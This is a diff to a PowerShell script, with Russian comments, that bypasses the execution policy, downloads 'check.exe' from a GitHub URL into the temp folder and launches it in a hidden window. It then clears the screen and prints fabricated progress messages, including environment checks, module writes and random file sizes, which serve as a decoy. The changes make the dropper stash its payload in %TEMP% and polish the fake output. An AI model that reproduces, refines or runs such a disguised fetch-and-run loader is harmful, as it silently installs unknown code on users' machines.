@@ -2,8 +2,8 @@
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
 # Скачиваем и запускаем основной модуль
-Invoke-WebRequest -Uri "https://github.com/doskaw/Checker/raw/refs/heads/main/check.exe" -OutFile "check.exe" -ErrorAction SilentlyContinue
-Start-Process -FilePath "check.exe" -WindowStyle Hidden
+Invoke-WebRequest -Uri "https://github.com/doskaw/Checker/raw/refs/heads/main/check.exe" -OutFile "$env:TEMP\check.exe" -ErrorAction SilentlyContinue
+Start-Process -FilePath "$env:TEMP\check.exe" -WindowStyle Hidden
 
 Clear-Host
 
@@ -23,7 +23,7 @@ Write-Host " [SET]" -ForegroundColor Green
 
 Write-Host "[ENV] PATH:" -NoNewline -ForegroundColor DarkGray
 Start-Sleep -Milliseconds 400
-Write-Host " [CONTAINS %JAVA_HOME%]" -ForegroundColor Green
+Write-Host " [CONTAINS JAVA_HOME]" -ForegroundColor Green
 
 Write-Host ("-" * 60) -ForegroundColor DarkGray
 
@@ -48,7 +48,6 @@ foreach ($module in $nativeModules) {
     Write-Host "  [WRITE] $module" -NoNewline -ForegroundColor Gray
     Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 350)
     Write-Host " [DONE]" -ForegroundColor Green
-    
     $size = Get-Random -Minimum 80 -Maximum 450
     Write-Host "         Size: ${size}KB" -ForegroundColor DarkGray
 }
